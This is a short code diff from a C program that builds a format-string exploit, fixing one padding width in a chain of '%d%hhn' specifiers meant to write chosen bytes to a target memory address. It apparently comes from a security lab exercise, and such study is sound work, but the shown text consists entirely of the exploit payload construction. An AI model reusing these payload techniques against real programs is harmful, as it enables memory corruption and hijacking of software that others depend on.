@@ -52,7 +52,7 @@ int main(void)
 	//  and the start address of freeString (0x20221960) is 16
 	//  bytes. Hence, there are two words in between.
 
-	strcat(exploit, "%8x%8x%79d%hhn");	// 152-41-16
+	strcat(exploit, "%8x%8x%95d%hhn");	// 152-41-16 = 95
 	strcat(exploit, "%130d%hhn");	// 26 - 152 + 256 = 130
 	strcat(exploit, "%7d%hhn");	// 33 - 26 = 7
 	strcat(exploit, "%1d%hhn");	// 34 - 33 = 1
